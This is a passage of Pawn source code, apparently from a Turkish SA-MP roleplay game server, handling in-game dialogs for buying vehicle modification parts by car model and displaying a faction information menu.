			    if(GetVehicleModel(kArac[playerid]) == 535)
			    {
			        if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Yeterli paranýz yok.[1000$]");
				    GivePlayerCash(playerid, -1000);
					if(GetVehicleModel(kArac[playerid]) == 535)
					{
						AracModifiyeleri[Arac[kArac[playerid]][aid]][ModLeftSideSkirt] = 1121;
					    AracModifiyeleri[Arac[kArac[playerid]][aid]][ModRightSideSkirt] = 1119;
						AddVehicleComponent(kArac[playerid], 1121);
						AddVehicleComponent(kArac[playerid], 1119);
						//ModifiyeYap(playerid, 1064, 800, 6, 120);
						//ModifiyeYap(playerid, 1064, 800, 6, 120);
					 	BilgileriKaydet(kArac[playerid]); Modifiyeli[kArac[playerid]] = 1;
					 	kArac[playerid] = 0;
					}
            	}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		}
		return 1;
	}
	if(dialogid == 206+5)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
            		if(GetVehicleModel(kArac[playerid]) == 565)
					{
						ModifiyeYap(playerid, 1046, 800, 6, 120);
					}
            		if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1064, 800, 6, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1028, 800, 6, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1034, 800, 6, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1065, 800, 6, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1092, 800, 6, 120); }
				}
                else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
		            if(GetVehicleModel(kArac[playerid]) == 565) { ModifiyeYap(playerid, 1045, 800, 6, 120); }
		            if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1059, 800, 6, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1029, 800, 6, 120); }
		            if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1037, 800, 6, 120); }
		            if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1066, 800, 6, 120); }
				    if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1089, 800, 6, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 2)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 535 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1043, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1105, 800, 6, 120); }
					if(GetVehicleModel(kArac[playerid]) == 535) { ModifiyeYap(playerid, 1114, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1127, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1132, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1135, 800, 6, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 3)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 535 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1044, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1104, 800, 6, 120); }
					if(GetVehicleModel(kArac[playerid]) == 535) { ModifiyeYap(playerid, 1113, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1126, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1129, 800, 6, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1136, 800, 6, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
		}
		return 1;
	}
	if(dialogid == 206+6)
	{
		if(response)
		{
   			if(listitem == 0)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1025, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 1)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1073, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 2)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1074, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 3)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1075, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 4)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1076, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 5)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1077, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 6)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1078, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 7)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1079, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 8)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1080, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 9)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1081, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 10)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1082, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 11)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1083, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 12)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1084, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 13)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1085, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 14)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1096, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 15)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1097, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
   			if(listitem == 16)
  			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
			  		ModifiyeYap(playerid, 1098, 500, 7, 120);
			  	}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
  			}
		}
	}
	if(dialogid == 206+7)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
            		if(GetVehicleModel(kArac[playerid]) == 565) { ModifiyeYap(playerid, 1153, 1000, 8, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1155, 1000, 8, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1169, 1000, 8, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1171, 1000, 8, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1160, 1000, 8, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1166, 1000, 8, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 565) { ModifiyeYap(playerid, 1152, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1157, 1000, 8, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1170, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1172, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1173, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1165, 1000, 8, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 2)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
					if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1174, 1000, 8, 120); }
	           	 	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1182, 1000, 8, 120); }
	          		if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1179, 1000, 8, 120); }
					if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1189, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1191, 1000, 8, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 3)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1175, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1181, 1000, 8, 120); }
	           	 	if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1185, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1188, 1000, 8, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1190, 1000, 8, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
		}
		return 1;
	}
	if(dialogid == 206+8)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
            		if(GetVehicleModel(kArac[playerid]) == 565) { ModifiyeYap(playerid, 1150, 1000, 9, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1154, 1000, 9, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1141, 1000, 9, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1149, 1000, 9, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1159, 1000, 9, 120); }
            		if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1168, 1000, 9, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 1)
			{
			    if(GetVehicleModel(kArac[playerid]) == 565 || GetVehicleModel(kArac[playerid]) == 561 || GetVehicleModel(kArac[playerid]) == 560 || GetVehicleModel(kArac[playerid]) == 562 || GetVehicleModel(kArac[playerid]) == 559 || GetVehicleModel(kArac[playerid]) == 558)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 565) { ModifiyeYap(playerid, 1151, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 561) { ModifiyeYap(playerid, 1156, 1000, 9, 120); }
					if(GetVehicleModel(kArac[playerid]) == 560) { ModifiyeYap(playerid, 1140, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 562) { ModifiyeYap(playerid, 1148, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 559) { ModifiyeYap(playerid, 1161, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 558) { ModifiyeYap(playerid, 1167, 1000, 9, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 2)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1176, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1184, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1180, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1187, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1192, 1000, 9, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
			if(listitem == 3)
			{
			    if(GetVehicleModel(kArac[playerid]) == 575 || GetVehicleModel(kArac[playerid]) == 536 || GetVehicleModel(kArac[playerid]) == 534 || GetVehicleModel(kArac[playerid]) == 567 || GetVehicleModel(kArac[playerid]) == 576)
			    {
	            	if(GetVehicleModel(kArac[playerid]) == 575) { ModifiyeYap(playerid, 1177, 1000, 9, 120); }
	           	 	if(GetVehicleModel(kArac[playerid]) == 536) { ModifiyeYap(playerid, 1181, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 534) { ModifiyeYap(playerid, 1178, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 567) { ModifiyeYap(playerid, 1186, 1000, 9, 120); }
	            	if(GetVehicleModel(kArac[playerid]) == 576) { ModifiyeYap(playerid, 1193, 1000, 9, 120); }
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
            }
		}
		return 1;
	}
	if(dialogid == 206+9)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 1009, 10000, 12, 120);
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 1)
			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 1008, 10000, 12, 240);
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
			if(listitem == 2)
			{
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 1010, 15000, 12, 360);
				}
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		}
		return 1;
	}
	if(dialogid == 206+10)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 18649, 500, 14, 100);
		        }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		    if(listitem == 1)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 18647, 500, 14, 100);
                }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		    if(listitem == 2)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 18650, 500, 14, 100);
                }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		    if(listitem == 3)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
  					ModifiyeYap(playerid, 18648, 500, 14, 100);
                }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		    if(listitem == 4)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
 					ModifiyeYap(playerid, 18651, 500, 14, 100);
                }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		    if(listitem == 5)
		    {
			    if(!ModifiyeEdilmeyecekArac(kArac[playerid]))
			    {
					ModifiyeYap(playerid, 18652, 500, 14, 100);
                }
				else
                {
					kArac[playerid] = 0;
					Hata(playerid,"Bu araç takmak istediðiniz parça için uygun deðil.");
					return 1;
                }
			}
		}
		return 1;
	}
	if(dialogid == 217)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0:
				{
				    new ctext[7],mstring[1024],ttext[14], ytext[6];
					switch(FEngel[Karakter[playerid][birlik]])
					{
						case 0:ctext = "Açýk";
						case 1:ctext = "Kapalý";
					}
					switch(Birlik[Karakter[playerid][birlik]][ftip])
					{
					    case 1:ttext = "LSPD";
					    case 2:ttext = "Hastane";
					    case 3:ttext = "Haber";
					    case 4:ttext = "Garaj";
					    case 5:ttext = "Yok";
					    case 6:ttext = "FBI";
					    case 7:ttext = "Nakliye";
					    case 8:ttext = "Legal";
					    case 9:ttext = "Çete";
					    case 10:ttext = "Mafya";
					    case 11:ttext = "Dövüþ";
					    case 12:ttext = "LSPA";
					    case 13:ttext = "Yarýþ";
					    case 14:ttext = "Hurdacý";
         				case 15:ttext = "LSFD";
         				case 16:ttext = "MC";
					    default:ttext = "Yok";
					}
					for(new i = 0; i < Birlik[Karakter[playerid][birlik]][seviye]; i++) {
					    format(ytext, 6, "%s"YILDIZ"", ytext);
 					}
					if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV) {
						format(mstring,sizeof(mstring),""NOKTA" "C2"Lider\t\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Tip\t\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Yýldýz\t\t "C2"["C1"%s"C2"(%d)]\n"NOKTA" "C2"Ýtibar\t\t "C2"[%s"C1"%d"C2"]",
						SQLFromName(Birlik[Karakter[playerid][birlik]][blider]),ttext,ytext,Birlik[Karakter[playerid][birlik]][seviye],"%",Birlik[Karakter[playerid][birlik]][itibar]);
						format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"OOC KANAL\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Hesap No\t "C2"["C1"%d"C2"]\n"NOKTA" "C2"Reklam Fiyatý\t "C2"["C1"%d"DOLAR"$"C2"]",
						mstring, ctext,Birlik[Karakter[playerid][birlik]][hesapno],Birlik[Karakter[playerid][birlik]][rfiyat]);
					}
					else {
						format(mstring,sizeof(mstring),""NOKTA" "C2"Lider\t\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Tip\t\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Yýldýz\t\t "C2"["C1"%s"C2"(%d)]\n"NOKTA" "C2"Ýtibar\t\t "C2"[%s"C1"%d"C2"]\n"NOKTA" "C2"OOC KANAL\t "C2"["C1"%s"C2"]\n"NOKTA" "C2"Hesap No\t "C2"["C1"%d"C2"]",
						SQLFromName(Birlik[Karakter[playerid][birlik]][blider]),ttext,ytext,Birlik[Karakter[playerid][birlik]][seviye],"%",Birlik[Karakter[playerid][birlik]][itibar],ctext,Birlik[Karakter[playerid][birlik]][hesapno]);
					}
					if(Birlik[Karakter[playerid][birlik]][ftip] == CETE) {
						switch(Birlik[Karakter[playerid][birlik]][seviye]) {
						    case 1: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star2Cost],FactionStars[0][Star2User]);
						    case 2: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star3Cost],FactionStars[0][Star3User]);
						    case 3: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star4Cost],FactionStars[0][Star4User]);
						    case 4: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star5Cost],FactionStars[0][Star5User]);
						    case 5: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t[Maksimum Seviye]",mstring);
						}
					}
					if(Birlik[Karakter[playerid][birlik]][ftip] == MC) {
						switch(Birlik[Karakter[playerid][birlik]][seviye]) {
						    case 1: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star2Cost],FactionStars[0][Star2User]);
						    case 2: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star3Cost],FactionStars[0][Star3User]);
						    case 3: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star4Cost],FactionStars[0][Star4User]);
						    case 4: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[0][Star5Cost],FactionStars[0][Star5User]);
						    case 5: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t[Maksimum Seviye]",mstring);
						}
					}
					if(Birlik[Karakter[playerid][birlik]][ftip] == MAFYA) {
						switch(Birlik[Karakter[playerid][birlik]][seviye]) {
						    case 1: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[1][Star2Cost],FactionStars[1][Star2User]);
						    case 2: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[1][Star3Cost],FactionStars[1][Star3User]);
						    case 3: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[1][Star4Cost],FactionStars[1][Star4User]);
						    case 4: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[1][Star5Cost],FactionStars[1][Star5User]);
						    case 5: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t[Maksimum Seviye]",mstring);
						}
					}
					if(Birlik[Karakter[playerid][birlik]][ftip] == YARIS) {
						switch(Birlik[Karakter[playerid][birlik]][seviye]) {
						    case 1: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[2][Star2Cost],FactionStars[2][Star2User]);
						    case 2: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t["DOLAR"$"C2"%d - %d Üye]",mstring,FactionStars[2][Star3Cost],FactionStars[2][Star3User]);
						    case 3: format(mstring,sizeof(mstring),"%s\n"NOKTA" "C2"Yýldýz Yükselt\t[Maksimum Seviye]",mstring);
						}
					}
					ShowPlayerDialog(playerid, 235, DIALOG_STYLE_LIST, BirlikBaslik(playerid), mstring, "Seç", "Geri");
				}
				case 1:
				{
				    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
				    if(IsPlayerInAnyVehicle(playerid))
				    {
				        new id = GetPlayerVehicleID(playerid);
				        if(Arac[id][aowner] == Karakter[playerid][sqlid])
				        {
							if(Arac[id][atip] == 5) return Hata(playerid, "Bu aracý birlik aracý yapamazsýnýz.");
							if(Arac[id][abirlik] == 255)
							{
							    new mstring[128];
